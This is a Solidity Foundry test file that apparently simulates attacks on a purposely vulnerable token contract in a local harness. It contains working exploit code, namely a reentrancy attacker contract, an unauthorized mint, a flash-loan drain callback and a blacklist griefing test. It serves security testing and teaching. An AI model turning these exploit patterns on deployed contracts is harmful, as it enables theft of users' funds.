// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/VulnerableToken.sol";

/// @title SimulationTest
/// @notice Runs all attack scenarios via Foundry for ChainMind.
contract SimulationTest is Test {
    VulnerableToken public token;
    address public attacker = address(0xDEAD);
    address public user1    = address(0xAAAA);
    address public user2    = address(0xBBBB);
    uint256 public INITIAL  = 1_000_000;

    function setUp() public {
        token = new VulnerableToken(INITIAL);
        vm.deal(address(token), 100 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);

        token.transfer(user1, 10_000 * 1e18);
        token.transfer(user2, 10_000 * 1e18);
        token.transfer(attacker, 5_000 * 1e18);
    }

    function test_ReentrancyAttack() public {
        vm.startPrank(attacker);
        token.stake(1_000 * 1e18);

        ReentrancyAttacker atkContract = new ReentrancyAttacker(payable(address(token)));
        token.transfer(address(atkContract), 1_000 * 1e18);
        vm.stopPrank();

        vm.startPrank(address(atkContract));
        token.stake(10 * 1e18);
        uint256 balBefore = token.balanceOf(address(atkContract));
        atkContract.attack(10 * 1e18);
        uint256 balAfter = token.balanceOf(address(atkContract));

        emit log_named_uint("Reentrancy token profit", balAfter - balBefore);
        assertTrue(balAfter > 10 * 1e18, "Reentrancy succeeded");
    }

    function test_UnauthorizedMint() public {
        uint256 supplyBefore = token.totalSupply();
        vm.prank(attacker);
        token.mint(attacker, 999_999_999 * 1e18);
        uint256 supplyAfter = token.totalSupply();

        emit log_named_uint("Tokens minted by attacker", supplyAfter - supplyBefore);
        assertGt(supplyAfter, supplyBefore);
    }

    function test_FlashLoanDrain() public {
        FlashLoanAttacker flashAtk = new FlashLoanAttacker(payable(address(token)));
        uint256 poolBal = token.balanceOf(address(token));
        emit log_named_uint("Pool balance before", poolBal);

        vm.prank(address(flashAtk));
        token.flashLoan(
            poolBal / 2,
            address(flashAtk),
            abi.encodeWithSignature("onFlashLoan(uint256)", poolBal / 2)
        );

        emit log_named_uint("Attacker balance after", token.balanceOf(address(flashAtk)));
    }

    function test_BlacklistGriefing() public {
        vm.prank(attacker);
        token.blacklist(token.owner());

        vm.startPrank(token.owner());
        vm.expectRevert("Blacklisted");
        token.transfer(user1, 100 * 1e18);
        vm.stopPrank();

        emit log_string("Blacklist griefing: owner paralyzed");
    }

    function test_MassUserInteraction() public {
        uint256 successCount = 0;
        for (uint256 i = 1; i <= 100; i++) {
            address user = address(uint160(i + 1000));
            vm.deal(user, 1 ether);
            token.mint(user, 1_000 * 1e18);
            vm.prank(user);
            try token.stake(500 * 1e18) {
                successCount++;
            } catch {}
        }
        emit log_named_uint("Successful stakes", successCount);
        assertGt(successCount, 0);
    }
}

// ─── ATTACKER CONTRACTS ─────────────────────────────────────

contract ReentrancyAttacker {
    VulnerableToken public target;
    uint256 public attackAmount;
    uint256 public attackCount;

    constructor(address payable _target) {
        target = VulnerableToken(_target);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        target.stake(amount);
        target.withdraw(amount);
    }

    receive() external payable {
        if (attackCount < 3) {
            attackCount++;
            target.withdraw(attackAmount);
        }
    }
}

contract FlashLoanAttacker {
    VulnerableToken public target;

    constructor(address payable _target) {
        target = VulnerableToken(_target);
    }

    function onFlashLoan(uint256) external {
        // Exploit: keep tokens, weak repayment check
    }
}
